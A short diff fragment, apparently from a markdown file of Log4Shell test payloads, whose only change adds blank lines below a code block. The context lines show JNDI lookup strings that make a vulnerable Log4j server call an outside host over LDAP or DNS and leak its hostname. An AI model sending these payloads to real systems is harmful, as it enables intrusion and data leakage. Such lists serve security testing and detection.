@@ -32,3 +32,5 @@ ${jndi:ldap://${hostName}.domain/a}
 ${jndi:dns://${hostName}.domain}
 
 ```
+
+
